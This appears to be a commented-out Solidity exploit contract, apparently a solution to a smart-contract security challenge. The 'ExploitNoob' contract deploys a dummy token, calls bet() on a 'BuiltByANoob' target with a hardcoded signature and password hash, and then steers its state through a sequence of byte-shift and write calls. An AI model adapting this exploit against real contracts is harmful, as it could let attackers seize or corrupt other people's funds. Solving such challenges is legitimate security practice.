// // SPDX-License-Identifier: UNLICENSED
// pragma solidity 0.7.2;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
// import "./BuiltByANoob.sol";

// contract GLDToken is ERC20 {
//     constructor(uint256 initialSupply) public ERC20("Gold", "GLD") {
//         _mint(msg.sender, initialSupply);
//     }
// }

// contract ExploitNoob {
//     //bytes32 constant passwordHash = 0xd1e8aeb79500496ef3dc2e57ba746a8315d048b7a664a2bf948db4fa91960483;
//     //bytes memory sig = 0xbea09ecad9c418f7c59d10bbe4c4764e33785050948268d2fcc1d82eeff8f5b54a4555024c2aac545c3f17ea3d49ab66312ebcd50c30ed64645e664f56ab3aca10;
//     constructor(
//         address exploitable,
//         bytes memory sig,
//         bytes32 passwordHash,
//         bytes memory initial
//     ) payable {
//         BuiltByANoob instance = BuiltByANoob(exploitable);
//         ERC20 token = new GLDToken(1000);
//         IERC20 _token = IERC20(token);
//         token.approve(address(instance), 100);
//         instance.bet(passwordHash, sig, _token, 1, initial);
//         //0x10 done
//         instance.write255();
//         instance.setHalfByte(bytes1(0x0b));
//         instance.shiftLeft(4);
//         instance.setHalfByte(bytes1(0x05));
//         // 0xb5 done
//         instance.write255();
//         instance.shiftRight(1);
//         instance.setHalfByte(bytes1(0x0e));
//         // 0x7e done
//         instance.write255();
//         instance.shiftLeft(6);
//         instance.shiftRight(1);
//         instance.setHalfByte(bytes1(0x0d));
//         // 0x6d done
//         instance.write0();
//         instance.setHalfByte(bytes1(0x0a));
//         instance.shiftLeft(4);
//     }

//     function finalize() external {
//         // can be used to finalize the exploit patten
//     }
// }
